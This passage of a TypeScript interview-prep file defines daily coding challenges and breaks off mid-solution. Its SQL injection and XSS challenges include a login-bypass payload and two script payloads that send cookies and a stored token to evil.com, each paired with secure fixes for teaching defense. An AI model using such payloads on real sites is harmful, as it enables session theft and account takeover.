import { useState, useEffect } from 'react';
import { Link } from 'react-router-dom';
import { AppShell } from '../components/AppShell';
import { Icon } from '../components/Icon';
import { useUser } from '../contexts/UserContext';

// ─── Types ────────────────────────────────────────────────────────────────────

type ChallengeType = 'dsa' | 'system-design' | 'behavioral' | 'sql' | 'security' | 'oop';

interface DailyChallenge {
  id: string;
  type: ChallengeType;
  title: string;
  difficulty: 'easy' | 'medium' | 'hard';
  prompt: string;
  hint: string;
  solution: string;
  tags: string[];
  xpReward: number;
  discussionPoints: string[];
}

// ─── 31 challenges (one per day-of-month, cycling) ───────────────────────────

const CHALLENGES: DailyChallenge[] = [
  {
    id: 'c01', type: 'dsa', title: 'Two Sum', difficulty: 'easy',
    prompt: 'Given an array of integers `nums` and an integer `target`, return indices of the two numbers that add up to `target`. You may not use the same element twice. Assume exactly one solution exists.\n\nExample:\nInput: nums = [2, 7, 11, 15], target = 9\nOutput: [0, 1] — because nums[0] + nums[1] = 2 + 7 = 9',
    hint: 'Use a hash map. As you iterate, check if `target - nums[i]` already exists in the map.',
    solution: `function twoSum(nums: number[], target: number): number[] {
  const map = new Map<number, number>(); // value → index
  for (let i = 0; i < nums.length; i++) {
    const complement = target - nums[i];
    if (map.has(complement)) return [map.get(complement)!, i];
    map.set(nums[i], i);
  }
  return []; // guaranteed to have a solution
}
// Time: O(n) | Space: O(n)`,
    tags: ['Arrays', 'Hashing'], xpReward: 30,
    discussionPoints: ['Why is a hash map O(1) lookup?', 'What if multiple solutions existed?', 'Can you do it in O(n log n) without extra space?'],
  },
  {
    id: 'c02', type: 'system-design', title: 'Design a URL Shortener', difficulty: 'medium',
    prompt: 'Design a URL shortening service like bit.ly.\n\nRequirements:\n• Shorten a URL (POST /shorten)\n• Redirect to original URL (GET /:code)\n• Handle 100M URLs/day writes, 10B redirects/day reads\n• URLs expire after 1 year\n\nEstimate storage, choose a key generation strategy, and design the redirect flow.',
    hint: 'Think about: base62 encoding, key generation service, Redis caching for hot redirects, 301 vs 302 redirect trade-offs.',
    solution: `// Key components:
// 1. Key Generation Service (KGS): pre-generates base62 keys in batches
//    Base62 (a-zA-Z0-9): 7 chars = 62^7 ≈ 3.5 trillion unique keys
// 2. Storage: Postgres/DynamoDB {short_id, long_url, user_id, expires_at, created_at}
// 3. Cache: Redis sorted set — cache top 20% of hot URLs (covers 80% of traffic)
// 4. Redirect: 302 (temp, analytics tracked) not 301 (cached forever by browser)

// Back-of-envelope:
// 100M URLs/day × 365 = 36.5B/year
// Average URL = 100 bytes → 3.65 TB/year
// Reads: 10B/day → ~115K rps → need Redis caching

// Schema:
// urls: id (BIGINT), short_code (VARCHAR 8, UNIQUE), long_url (TEXT),
//       created_at (TIMESTAMP), expires_at (TIMESTAMP), click_count (BIGINT)

// Redirect handler (simplified):
async function redirect(shortCode: string, res: Response) {
  let url = await redis.get(\`url:\${shortCode}\`);
  if (!url) {
    const row = await db.urls.findUnique({ where: { shortCode } });
    if (!row || row.expiresAt < new Date()) return res.status(404).end();
    url = row.longUrl;
    await redis.setex(\`url:\${shortCode}\`, 3600, url);
  }
  await redis.incr(\`clicks:\${shortCode}\`); // async click tracking
  res.redirect(302, url);
}`,
    tags: ['System Design', 'Caching', 'Databases'], xpReward: 80,
    discussionPoints: ['Why 302 instead of 301?', 'How do you handle custom aliases?', 'How do you prevent enumeration attacks (sequential IDs)?'],
  },
  {
    id: 'c03', type: 'behavioral', title: 'Tell Me About a Time You Failed', difficulty: 'medium',
    prompt: 'One of the most common — and feared — behavioral interview questions. Interviewers want to see self-awareness, ownership, and how you grow from setbacks.\n\n**Task:** Craft a compelling STAR answer (Situation, Task, Action, Result) for a real professional failure.\n\nAvoid:\n• Fake failures ("I work too hard")\n• Blaming others\n• Failures with no learning',
    hint: 'Pick a real failure where YOU made a mistake. Show that you: (1) recognized it quickly, (2) took ownership, (3) fixed it, (4) learned something that changed your behavior.',
    solution: `STAR Framework for "Tell me about a failure":

S — Situation: Set context briefly.
"At my last internship, I was tasked with migrating our user auth
 service to a new JWT library on a tight deadline."

T — Task: What was your responsibility?
"I was the sole engineer on this migration and responsible for
 testing it before the Friday release."

A — Action: What did YOU do (and what went wrong)?
"I underestimated the scope and didn't write integration tests
 for token refresh flows. I shipped on Friday confident it was working."

R — Result + Learning: What happened and what changed?
"Three hours later, users started getting logged out randomly.
 We had to roll back and I spent the weekend fixing it. I learned to
 never skip integration tests for auth flows, and I now write a testing
 checklist before marking any security-critical PR as ready."

Key: Show the learning changed your BEHAVIOR, not just your mindset.`,
    tags: ['Behavioral', 'STAR', 'Leadership'], xpReward: 50,
    discussionPoints: ['Why do interviewers ask this?', 'How much detail is too much?', 'How to pivot if you can\'t think of a real failure?'],
  },
  {
    id: 'c04', type: 'dsa', title: 'Valid Parentheses', difficulty: 'easy',
    prompt: 'Given a string `s` containing only \'(\', \')\', \'{\', \'}\', \'[\', \']\', determine if the input string is valid.\n\nA string is valid if:\n• Open brackets are closed by the same type\n• Open brackets are closed in the correct order\n• Every close bracket has a corresponding open bracket\n\nExample:\n"()[]{}" → true\n"([)]" → false\n"{[]}" → true',
    hint: 'Classic stack problem. Push open brackets onto the stack. On a close bracket, check if the top of the stack is the matching open bracket.',
    solution: `function isValid(s: string): boolean {
  const stack: string[] = [];
  const matching: Record<string, string> = { ')': '(', '}': '{', ']': '[' };
  for (const char of s) {
    if ('({['.includes(char)) {
      stack.push(char);
    } else {
      if (stack.pop() !== matching[char]) return false;
    }
  }
  return stack.length === 0;
}
// Time: O(n) | Space: O(n)`,
    tags: ['Stack', 'Strings'], xpReward: 30,
    discussionPoints: ['When is a stack the right data structure?', 'What if the string has other characters?', 'How would you print which bracket is mismatched?'],
  },
  {
    id: 'c05', type: 'sql', title: 'Top Earners per Department', difficulty: 'medium',
    prompt: 'Write a SQL query to find the employee(s) with the highest salary in each department.\n\nSchema:\n```\nemployees(id, name, salary, department_id)\ndepartments(id, name)\n```\n\nReturn: department_name, employee_name, salary\nOrder by salary DESC',
    hint: 'Use window functions (RANK or DENSE_RANK OVER PARTITION BY department_id) or a correlated subquery with MAX(salary).',
    solution: `-- Solution 1: Window function (clean, modern)
SELECT department_name, employee_name, salary
FROM (
  SELECT
    d.name AS department_name,
    e.name AS employee_name,
    e.salary,
    DENSE_RANK() OVER (PARTITION BY e.department_id ORDER BY e.salary DESC) AS rk
  FROM employees e
  JOIN departments d ON d.id = e.department_id
) ranked
WHERE rk = 1
ORDER BY salary DESC;

-- Solution 2: Correlated subquery (compatible with older SQL)
SELECT d.name AS department_name, e.name AS employee_name, e.salary
FROM employees e
JOIN departments d ON d.id = e.department_id
WHERE e.salary = (
  SELECT MAX(salary) FROM employees WHERE department_id = e.department_id
)
ORDER BY e.salary DESC;`,
    tags: ['SQL', 'Window Functions'], xpReward: 60,
    discussionPoints: ['RANK vs DENSE_RANK vs ROW_NUMBER?', 'How does PARTITION BY differ from GROUP BY?', 'Which solution performs better at scale?'],
  },
  {
    id: 'c06', type: 'dsa', title: 'Maximum Subarray (Kadane\'s)', difficulty: 'medium',
    prompt: 'Given an integer array `nums`, find the subarray with the largest sum and return the sum.\n\nExample:\nInput: [-2, 1, -3, 4, -1, 2, 1, -5, 4]\nOutput: 6 — subarray [4, -1, 2, 1]\n\nFollow-up: Can you do it in O(n) time?',
    hint: 'Kadane\'s algorithm: at each position, decide whether to extend the existing subarray or start fresh. `current = max(nums[i], current + nums[i])`.',
    solution: `function maxSubArray(nums: number[]): number {
  let maxSum = nums[0]!;
  let currentSum = nums[0]!;
  for (let i = 1; i < nums.length; i++) {
    currentSum = Math.max(nums[i]!, currentSum + nums[i]!);
    maxSum = Math.max(maxSum, currentSum);
  }
  return maxSum;
}
// Time: O(n) | Space: O(1)
// Key insight: if currentSum goes negative, it can only hurt future sums — reset to nums[i]`,
    tags: ['Arrays', 'Dynamic Programming'], xpReward: 60,
    discussionPoints: ['Why does this work? Prove the greedy choice is optimal.', 'How to also return the start and end indices?', 'What about circular arrays (LC 918)?'],
  },
  {
    id: 'c07', type: 'security', title: 'SQL Injection Defense', difficulty: 'medium',
    prompt: 'Your team has the following user login endpoint:\n\n```typescript\nasync function login(username: string, password: string) {\n  const query = `SELECT * FROM users WHERE username = \'${username}\' AND password = \'${password}\'`;\n  return await db.query(query);\n}\n```\n\n**Task:**\n1. Identify the vulnerability\n2. Show an exploit payload\n3. Rewrite the code securely',
    hint: 'The string interpolation allows SQL to be injected. Use parameterized queries. Never concatenate user input into SQL strings.',
    solution: `// Vulnerability: SQL Injection via string concatenation
// Exploit: username = "' OR '1'='1'; --"
// Resulting query: SELECT * FROM users WHERE username = '' OR '1'='1'; --' AND ...
// → Returns ALL users! Attacker logs in as the first user (often admin)

// Secure version 1: Parameterized query (native driver)
async function loginSecure(username: string, password: string) {
  const result = await db.query(
    'SELECT * FROM users WHERE username = $1 AND password_hash = $2',
    [username, await hashPassword(password)] // NEVER store plaintext passwords
  );
  return result.rows[0] ?? null;
}

// Secure version 2: ORM (Prisma — automatically parameterized)
async function loginPrisma(username: string, password: string) {
  const user = await prisma.user.findFirst({
    where: { username } // Prisma escapes all inputs
  });
  if (!user) return null;
  const valid = await bcrypt.compare(password, user.passwordHash);
  return valid ? user : null;
}

// Also: store bcrypt hashes (not plaintext), use rate limiting on login endpoint`,
    tags: ['Security', 'SQL', 'OWASP'], xpReward: 70,
    discussionPoints: ['Why is parameterization safer than escaping?', 'What other attack vectors exist on a login form?', 'How does bcrypt protect against rainbow table attacks?'],
  },
  {
    id: 'c08', type: 'dsa', title: 'Climb Stairs', difficulty: 'easy',
    prompt: 'You are climbing a staircase with `n` steps. Each time you can climb 1 or 2 steps. In how many distinct ways can you climb to the top?\n\nExample:\nn = 3 → 3 (1+1+1, 1+2, 2+1)\nn = 5 → 8\n\nSpot the pattern?',
    hint: 'This is Fibonacci! ways(n) = ways(n-1) + ways(n-2). You can reach step n either from step n-1 (1 step) or step n-2 (2 steps).',
    solution: `function climbStairs(n: number): number {
  if (n <= 2) return n;
  let prev2 = 1, prev1 = 2;
  for (let i = 3; i <= n; i++) {
    [prev2, prev1] = [prev1, prev1 + prev2];
  }
  return prev1;
}
// Time: O(n) | Space: O(1) — no array needed, just track last 2 values

// Why Fibonacci? dp[n] = dp[n-1] + dp[n-2]
// dp[1] = 1, dp[2] = 2, dp[3] = 3, dp[4] = 5, dp[5] = 8 ...`,
    tags: ['Dynamic Programming', 'Recursion'], xpReward: 30,
    discussionPoints: ['What if you could also take 3 steps?', 'Why does space-optimized DP work here?', 'How does this relate to the Fibonacci sequence?'],
  },
  {
    id: 'c09', type: 'oop', title: 'Design a Parking Lot', difficulty: 'medium',
    prompt: 'Design an OOP model for a parking lot system.\n\nRequirements:\n• Multiple levels, each with multiple spots\n• Spot types: Motorcycle, Compact, Large\n• Vehicles: Motorcycle, Car, Truck\n• Park a vehicle, exit a vehicle, check availability\n• Generate a ticket on entry\n\nFocus on class hierarchy, relationships, and encapsulation.',
    hint: 'Think about: ParkingLot (1) → Levels (many) → Spots (many). Vehicle and Spot should have type enums. A Ticket records entry time and spot for billing.',
    solution: `enum SpotSize { MOTORCYCLE, COMPACT, LARGE }
enum VehicleType { MOTORCYCLE, CAR, TRUCK }

// Vehicle hierarchy
abstract class Vehicle {
  constructor(public readonly plate: string, public readonly type: VehicleType) {}
  abstract fitsIn(spot: ParkingSpot): boolean;
}
class Motorcycle extends Vehicle {
  constructor(plate: string) { super(plate, VehicleType.MOTORCYCLE); }
  fitsIn(spot: ParkingSpot) { return true; } // fits anywhere
}
class Car extends Vehicle {
  constructor(plate: string) { super(plate, VehicleType.CAR); }
  fitsIn(spot: ParkingSpot) { return spot.size !== SpotSize.MOTORCYCLE; }
}
class Truck extends Vehicle {
  constructor(plate: string) { super(plate, VehicleType.TRUCK); }
  fitsIn(spot: ParkingSpot) { return spot.size === SpotSize.LARGE; }
}

class ParkingSpot {
  private vehicle: Vehicle | null = null;
  constructor(public readonly id: string, public readonly size: SpotSize) {}
  get isAvailable() { return this.vehicle === null; }
  park(v: Vehicle): boolean {
    if (!this.isAvailable || !v.fitsIn(this)) return false;
    this.vehicle = v;
    return true;
  }
  release(): Vehicle | null {
    const v = this.vehicle;
    this.vehicle = null;
    return v;
  }
}

class ParkingLevel {
  readonly spots: ParkingSpot[];
  constructor(public readonly level: number, spotsPerLevel: number) {
    this.spots = Array.from({ length: spotsPerLevel }, (_, i) => {
      const size = i < 10 ? SpotSize.MOTORCYCLE : i < 30 ? SpotSize.COMPACT : SpotSize.LARGE;
      return new ParkingSpot(\`L\${level}-S\${i}\`, size);
    });
  }
  findSpot(v: Vehicle): ParkingSpot | null {
    return this.spots.find(s => s.isAvailable && v.fitsIn(s)) ?? null;
  }
}

class ParkingLot {
  private levels: ParkingLevel[];
  private tickets = new Map<string, { spot: ParkingSpot; entryTime: Date }>();
  constructor(numLevels: number, spotsPerLevel: number) {
    this.levels = Array.from({ length: numLevels }, (_, i) => new ParkingLevel(i + 1, spotsPerLevel));
  }
  park(vehicle: Vehicle): string | null {
    for (const level of this.levels) {
      const spot = level.findSpot(vehicle);
      if (spot?.park(vehicle)) {
        const ticketId = \`T-\${Date.now()}\`;
        this.tickets.set(ticketId, { spot, entryTime: new Date() });
        return ticketId;
      }
    }
    return null; // full
  }
  exit(ticketId: string): number {
    const ticket = this.tickets.get(ticketId);
    if (!ticket) throw new Error('Invalid ticket');
    ticket.spot.release();
    this.tickets.delete(ticketId);
    const hours = (Date.now() - ticket.entryTime.getTime()) / 3600000;
    return Math.ceil(hours) * 5; // $5/hour
  }
}`,
    tags: ['OOP', 'System Design'], xpReward: 80,
    discussionPoints: ['How does the fitsIn() method implement Liskov Substitution?', 'Where would you add pricing strategy?', 'How to handle handicapped spots?'],
  },
  {
    id: 'c10', type: 'dsa', title: 'Reverse a Linked List', difficulty: 'easy',
    prompt: 'Given the head of a singly linked list, reverse the list and return the new head.\n\nExample:\n1 → 2 → 3 → 4 → 5 → null\nbecomes:\n5 → 4 → 3 → 2 → 1 → null\n\nBonus: implement both iterative and recursive solutions.',
    hint: 'Iterative: use three pointers (prev, current, next). Save next, point current to prev, advance. Recursive: reverse from the end back.',
    solution: `interface ListNode { val: number; next: ListNode | null; }

// Iterative — O(n) time, O(1) space
function reverseList(head: ListNode | null): ListNode | null {
  let prev: ListNode | null = null;
  let curr = head;
  while (curr) {
    const next = curr.next;  // save next
    curr.next = prev;         // reverse the link
    prev = curr;              // advance prev
    curr = next;              // advance curr
  }
  return prev; // new head
}

// Recursive — O(n) time, O(n) space (call stack)
function reverseListRec(head: ListNode | null): ListNode | null {
  if (!head || !head.next) return head;
  const newHead = reverseListRec(head.next); // reverse rest
  head.next.next = head; // make next node point back to head
  head.next = null;       // break original forward link
  return newHead;
}`,
    tags: ['Linked List', 'Recursion'], xpReward: 30,
    discussionPoints: ['When would you use recursive over iterative?', 'What is the space complexity of the recursive solution?', 'How to reverse only a portion of the list (LC 92)?'],
  },
  {
    id: 'c11', type: 'system-design', title: 'Design a Rate Limiter', difficulty: 'medium',
    prompt: 'Design a rate limiter for an API gateway.\n\nRequirements:\n• Limit each user to 100 requests per minute\n• Return 429 Too Many Requests when exceeded\n• Include Retry-After header\n• Work correctly across multiple API server instances\n• Low latency overhead (< 5ms)\n\nWhich algorithm would you choose and why?',
    hint: 'Token bucket with Redis is the industry standard. Redis atomic Lua scripts handle distributed environments. The key is: never do a read-then-write — do it atomically.',
    solution: `// Token Bucket with Redis (distributed, atomic)
// Capacity: 100 tokens | Refill rate: 100/60 ≈ 1.67 tokens/second

const RATE_LIMIT_SCRIPT = \`
  local key = KEYS[1]
  local cap = tonumber(ARGV[1])    -- 100 tokens
  local rate = tonumber(ARGV[2])   -- 1.67 tokens/sec
  local now = tonumber(ARGV[3])    -- current time (seconds)
  local cost = tonumber(ARGV[4])   -- 1 token per request
  local bucket = redis.call('HMGET', key, 'tokens', 'ts')
  local tokens = tonumber(bucket[1]) or cap
  local ts = tonumber(bucket[2]) or now
  tokens = math.min(cap, tokens + (now - ts) * rate)
  if tokens >= cost then
    redis.call('HMSET', key, 'tokens', tokens - cost, 'ts', now)
    redis.call('EXPIRE', key, 3600)
    return {1, math.floor(tokens - cost)} -- allowed, remaining
  end
  return {0, 0} -- denied
\`;

async function rateLimitMiddleware(req: Request, res: Response, next: NextFunction) {
  const key = \`rl:\${req.user.id}\`;
  const [allowed, remaining] = await redis.eval(
    RATE_LIMIT_SCRIPT, 1, key, 100, 100/60, Date.now()/1000, 1
  );
  res.set('X-RateLimit-Limit', '100');
  res.set('X-RateLimit-Remaining', String(remaining));
  res.set('X-RateLimit-Reset', String(Math.floor(Date.now()/1000) + 60));
  if (!allowed) {
    res.set('Retry-After', '60');
    return res.status(429).json({ error: 'Too many requests', retryAfter: 60 });
  }
  next();
}`,
    tags: ['System Design', 'Redis', 'Rate Limiting'], xpReward: 80,
    discussionPoints: ['Why token bucket over fixed window?', 'How does the Lua script provide atomicity?', 'How to handle rate limits per IP, user, and API key simultaneously?'],
  },
  {
    id: 'c12', type: 'dsa', title: 'Number of Islands', difficulty: 'medium',
    prompt: 'Given a 2D grid of \'1\'s (land) and \'0\'s (water), return the number of islands. An island is surrounded by water and is formed by connecting adjacent lands horizontally or vertically.\n\nExample:\n```\n1 1 0 0 0\n1 1 0 0 0\n0 0 1 0 0\n0 0 0 1 1\n```\nOutput: 3',
    hint: 'DFS or BFS flood fill. When you find a \'1\', increment count and flood-fill all connected \'1\'s to \'0\' (mark as visited). Count how many times you start a flood fill.',
    solution: `function numIslands(grid: string[][]): number {
  const rows = grid.length, cols = grid[0]?.length ?? 0;
  let count = 0;
  function dfs(r: number, c: number) {
    if (r < 0 || r >= rows || c < 0 || c >= cols || grid[r]![c] !== '1') return;
    grid[r]![c] = '0'; // mark visited
    dfs(r+1, c); dfs(r-1, c); dfs(r, c+1); dfs(r, c-1);
  }
  for (let r = 0; r < rows; r++) {
    for (let c = 0; c < cols; c++) {
      if (grid[r]![c] === '1') { count++; dfs(r, c); }
    }
  }
  return count;
}
// Time: O(M×N) | Space: O(M×N) worst case (recursion stack for one big island)
// BFS alternative: use a queue instead of recursion (avoids stack overflow for huge grids)`,
    tags: ['Graphs', 'Recursion'], xpReward: 60,
    discussionPoints: ['When would you prefer BFS over DFS here?', 'How to avoid modifying the input? (Use a visited set)', 'How to find the number of islands in a stream of updates? (Union-Find)'],
  },
  {
    id: 'c13', type: 'behavioral', title: 'Disagreement with a Manager', difficulty: 'hard',
    prompt: 'Interviewers (especially at Amazon) ask: **"Tell me about a time you disagreed with your manager or team and how you handled it."**\n\nThis tests: assertiveness (can you push back professionally?), collaboration (do you work through disagreement?), and judgment (when do you escalate vs concede?).\n\n**Task:** Write a STAR answer. Key: show that you disagreed respectfully, made a data-driven case, and either won them over OR gracefully accepted the decision.',
    hint: 'Amazon\'s "Have Backbone; Disagree and Commit" LP: challenge respectfully, commit once decided. Don\'t frame as "my manager was wrong." Frame as "we had different information."',
    solution: `Strong STAR structure for disagreement questions:

S: Our team was planning to rewrite the entire authentication service
   in the last 2 weeks of Q4 to "clean it up."

T: I was the lead engineer and had concerns about the timeline and risk.

A: Instead of just saying "this is risky," I prepared a brief doc:
   1. Risk analysis: What breaks if auth goes down (everything)
   2. Timeline analysis: 2 weeks was insufficient — similar past rewrites
      took 6 weeks with proper testing
   3. Proposed alternative: incremental refactor over Q1 with zero downtime
   I shared this async before our planning meeting, giving my manager
   time to review. In the meeting, I walked through the analysis calmly.
   My manager had new context I didn't — a compliance deadline that required
   the rewrite. We agreed on a compromise: rewrite the critical auth path
   now, defer non-critical cleanup to Q1.

R: Auth rewrite shipped in 3 weeks (1 week over, but safer). Zero
   incidents. I learned that my manager often has constraints I don't see,
   so I now start disagreements by asking "What context am I missing?"

Keys:
• Bring DATA, not opinions
• Ask for their perspective first
• Commit fully once decided ("disagree and commit")
• Never say "I was right and they were wrong"`,
    tags: ['Behavioral', 'Leadership', 'STAR'], xpReward: 60,
    discussionPoints: ['How is this different at Amazon vs Google vs a startup?', 'When should you escalate beyond your manager?', 'What if you committed and the outcome was bad?'],
  },
  {
    id: 'c14', type: 'dsa', title: 'Coin Change', difficulty: 'medium',
    prompt: 'You have coins of various denominations and an amount `amount`. Return the fewest number of coins needed to make up that amount. Return -1 if it\'s not possible.\n\nExample:\ncoins = [1, 5, 11], amount = 15\nOutput: 3 (5 + 5 + 5, not 11 + 1 + 1 + 1 + 1 which is 5)\n\nNote: greedy (largest coin first) doesn\'t always work!',
    hint: 'DP: dp[i] = minimum coins to make amount i. dp[0] = 0. For each amount, try all coins: dp[i] = min(dp[i], dp[i - coin] + 1).',
    solution: `function coinChange(coins: number[], amount: number): number {
  const dp = new Array(amount + 1).fill(Infinity);
  dp[0] = 0;
  for (let i = 1; i <= amount; i++) {
    for (const coin of coins) {
      if (i - coin >= 0 && dp[i - coin] !== Infinity) {
        dp[i] = Math.min(dp[i], dp[i - coin] + 1);
      }
    }
  }
  return dp[amount] === Infinity ? -1 : dp[amount];
}
// Time: O(amount × coins.length) | Space: O(amount)

// Why greedy fails: coins=[1,5,11], amount=15
// Greedy: 11 + 1 + 1 + 1 + 1 = 5 coins
// DP:     5 + 5 + 5 = 3 coins ✓`,
    tags: ['Dynamic Programming', 'Recursion'], xpReward: 60,
    discussionPoints: ['Why doesn\'t greedy work here?', 'How to also track which coins were used?', 'How does this relate to the knapsack problem?'],
  },
  {
    id: 'c15', type: 'sql', title: 'Find Users With No Orders', difficulty: 'easy',
    prompt: 'Given two tables, find all users who have never placed an order.\n\n```sql\nusers(id, name, email, created_at)\norders(id, user_id, amount, created_at)\n```\n\nReturn user name and email. Write at least 2 different approaches.',
    hint: 'Three ways: LEFT JOIN with NULL check, NOT IN subquery, NOT EXISTS correlated subquery. NOT EXISTS is usually the most performant.',
    solution: `-- Solution 1: LEFT JOIN + NULL check (most readable)
SELECT u.name, u.email
FROM users u
LEFT JOIN orders o ON o.user_id = u.id
WHERE o.id IS NULL;

-- Solution 2: NOT IN subquery
SELECT name, email
FROM users
WHERE id NOT IN (SELECT DISTINCT user_id FROM orders);
-- ⚠️ Careful: NOT IN behaves unexpectedly if subquery returns NULLs

-- Solution 3: NOT EXISTS (usually fastest — short-circuits on first match)
SELECT name, email
FROM users u
WHERE NOT EXISTS (
  SELECT 1 FROM orders WHERE user_id = u.id
);

-- Performance ranking (usually):
-- NOT EXISTS ≥ LEFT JOIN > NOT IN
-- NOT IN is dangerous if user_id can be NULL in orders table`,
    tags: ['SQL', 'Joins'], xpReward: 40,
    discussionPoints: ['Why can NOT IN give wrong results with NULLs?', 'How does the query planner optimize NOT EXISTS?', 'How to also show users with < 3 orders?'],
  },
  {
    id: 'c16', type: 'dsa', title: 'Longest Substring Without Repeating Characters', difficulty: 'medium',
    prompt: 'Given a string `s`, find the length of the longest substring without repeating characters.\n\nExample:\n"abcabcbb" → 3 ("abc")\n"bbbbb" → 1 ("b")\n"pwwkew" → 3 ("wke")',
    hint: 'Sliding window with a hash set (or character frequency map). Expand right; when you see a duplicate, shrink from left until no duplicate.',
    solution: `function lengthOfLongestSubstring(s: string): number {
  const seen = new Set<string>();
  let left = 0, maxLen = 0;
  for (let right = 0; right < s.length; right++) {
    while (seen.has(s[right]!)) {
      seen.delete(s[left]!);
      left++;
    }
    seen.add(s[right]!);
    maxLen = Math.max(maxLen, right - left + 1);
  }
  return maxLen;
}
// Time: O(n) — each char added and removed from set at most once
// Space: O(min(n, charset)) — set size bounded by unique chars

// Optimized: store last seen index to jump left pointer directly
function lengthFast(s: string): number {
  const map = new Map<string, number>(); // char → last index
  let left = 0, maxLen = 0;
  for (let r = 0; r < s.length; r++) {
    if (map.has(s[r]!)) left = Math.max(left, map.get(s[r]!)! + 1);
    map.set(s[r]!, r);
    maxLen = Math.max(maxLen, r - left + 1);
  }
  return maxLen;
}`,
    tags: ['Strings', 'Sliding Window', 'Hashing'], xpReward: 60,
    discussionPoints: ['When to use Set vs Map for sliding window?', 'What is the time complexity difference between the two solutions?', 'How to also return the actual substring?'],
  },
  {
    id: 'c17', type: 'security', title: 'XSS Attack Prevention', difficulty: 'medium',
    prompt: 'Your social platform lets users post comments with a name and message. Here\'s the vulnerable render code:\n\n```javascript\ndiv.innerHTML = `<b>${comment.author}</b>: ${comment.text}`;\n```\n\nA user submits:\n- author: `<script>document.location=\'https://evil.com/steal?c=\'+document.cookie</script>`\n- text: `<img src=x onerror="fetch(\'https://evil.com/\'+localStorage.token)">`\n\n**Task:** Explain both attacks and rewrite the code securely.',
    hint: 'Never set innerHTML with user content. Use textContent or DOM creation APIs. For rich text, use a whitelist-based HTML sanitizer (DOMPurify).',
    solution: `// Both are XSS (Cross-Site Scripting) attacks:
// Attack 1 (Stored XSS): <script> tag steals cookies and sends to evil.com
// Attack 2 (Stored XSS): <img onerror> fires JS on broken image load — steals localStorage

// Fix 1: Use textContent (escapes everything — no HTML allowed)
function renderCommentSafe(comment: { author: string; text: string }): void {
  const container = document.createElement('div');
  const author = document.createElement('b');
  author.textContent = comment.author; // SAFE: textContent never executes scripts
  container.appendChild(author);
  container.append(': ' + comment.text); // textContent equivalent
  commentList.appendChild(container);
}

// Fix 2: If you need rich text, sanitize with DOMPurify
import DOMPurify from 'dompurify';
div.innerHTML = DOMPurify.sanitize(\`<b>\${comment.author}</b>: \${comment.text}\`);
// DOMPurify strips all <script> tags and dangerous attributes

// Fix 3: Content Security Policy (CSP) header — defense in depth
// Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
// Prevents inline scripts and external script loading even if XSS occurs

// Summary of XSS prevention layers:
// 1. Output encoding (textContent / DOMPurify) — PRIMARY defense
// 2. CSP header — blocks execution even if encoding fails
// 3. HttpOnly cookies — JS can't read them even during XSS`,
    tags: ['Security', 'XSS', 'OWASP'], xpReward: 70,
    discussionPoints: ['What is the difference between Stored, Reflected, and DOM-based XSS?', 'When is innerHTML safe to use?', 'How does a CSP header help but not fully prevent XSS?'],
  },
  {
    id: 'c18', type: 'dsa', title: 'Binary Search', difficulty: 'easy',
    prompt: 'Given a sorted array of integers `nums` and a target value, return the index of target. If not found, return -1.\n\nDo NOT use `Array.indexOf()`. Implement binary search with O(log n) complexity.\n\nExample:\nnums = [-1, 0, 3, 5, 9, 12], target = 9 → 4\ntarget = 2 → -1',
    hint: 'Compare target to the middle element. If target < mid, search left half. If target > mid, search right half. Loop while left <= right.',
    solution: `function search(nums: number[], target: number): number {
  let left = 0, right = nums.length - 1;
  while (left <= right) {
    const mid = left + Math.floor((right - left) / 2); // avoids integer overflow
    if (nums[mid] === target) return mid;
    else if (nums[mid]! < target) left = mid + 1;  // search right half
    else right = mid - 1;                           // search left half
  }
  return -1; // not found
}
// Time: O(log n) | Space: O(1)

// Common binary search variants:
// • Find insertion position: return left (after loop)
// • First occurrence: when found, set right = mid - 1, remember mid
// • Last occurrence: when found, set left = mid + 1, remember mid
// • Search in rotated array: determine which half is sorted, apply binary search to it`,
    tags: ['Arrays', 'Binary Search'], xpReward: 30,
    discussionPoints: ['Why use `left + (right - left) / 2` instead of `(left + right) / 2`?', 'What\'s the invariant in binary search?', 'Can binary search be applied to non-array problems? (e.g., minimize/maximize something)'],
  },
  {
    id: 'c19', type: 'system-design', title: 'Design a Notification System', difficulty: 'hard',
    prompt: 'Design a notification system that sends Push, Email, and SMS notifications.\n\nRequirements:\n• Support 10M notifications/day\n• Types: marketing (bulk), transactional (critical), alerts (real-time)\n• User preferences (opt-out per channel, quiet hours)\n• Delivery guarantees: at-least-once for transactional\n• Track delivery and open rates\n\nDesign the architecture, message flow, and failure handling.',
    hint: 'Key components: API Gateway → Message Queue (Kafka) → Channel Workers → 3rd party providers (FCM, SES, Twilio). Separate critical from bulk traffic.',
    solution: `// Architecture:

// 1. Notification API (POST /notifications)
//    - Validates request, enriches with user preferences
//    - Routes to appropriate Kafka topic:
//      • "notifications.critical" (transactional) — dedicated consumers
//      • "notifications.bulk" (marketing) — rate-limited consumers

// 2. Kafka Topics (partitioned by user_id for ordering)
//    - notifications.critical  (retention: 7 days, replication: 3)
//    - notifications.bulk      (retention: 1 day)
//    - notifications.events    (delivery/open tracking)

// 3. Channel Workers (push/email/sms)
//    - Pull from Kafka, call 3rd party APIs (FCM, AWS SES, Twilio)
//    - Exponential backoff on failure (3 retries)
//    - Dead-letter queue for permanently failed messages
//    - Rate limit bulk sends to respect provider limits

// 4. User Preference Service (Redis cache)
//    - userPrefs:userId → {push: true, email: true, sms: false, quietHours: "22-8"}
//    - Check before dispatching to any channel

// 5. Idempotency
//    - Each notification has idempotency key (UUID)
//    - Workers check Redis: "sent:notifId:channel" before sending
//    - Prevents duplicate sends on retry

// Flow:
// Client → API → validate + enrich → Kafka → Worker → 3rd party
//                                           ↓ on failure
//                                       DLQ → alert on-call

// Schema:
// notifications: id, user_id, type, channel, status, payload, created_at, sent_at
// notification_events: id, notif_id, event (queued|sent|delivered|opened), ts`,
    tags: ['System Design', 'Kafka', 'Microservices'], xpReward: 100,
    discussionPoints: ['How do you prevent notification spam for marketing?', 'How do you handle provider outages (FCM down)?', 'How to implement A/B testing for notification content?'],
  },
  {
    id: 'c20', type: 'dsa', title: 'LRU Cache', difficulty: 'hard',
    prompt: 'Implement an LRU (Least Recently Used) cache with `get(key)` and `put(key, value)` operations, both in O(1) time.\n\n• `get(key)`: return value if exists (and mark as recently used), else -1\n• `put(key, value)`: insert/update. If capacity exceeded, evict least recently used\n\nExample (capacity = 2):\nput(1,1) → put(2,2) → get(1) → 1 → put(3,3) [evicts key 2] → get(2) → -1',
    hint: 'Combine a HashMap (O(1) lookup) with a doubly linked list (O(1) move-to-front and remove-from-back). The list order represents recency.',
    solution: `class Node {
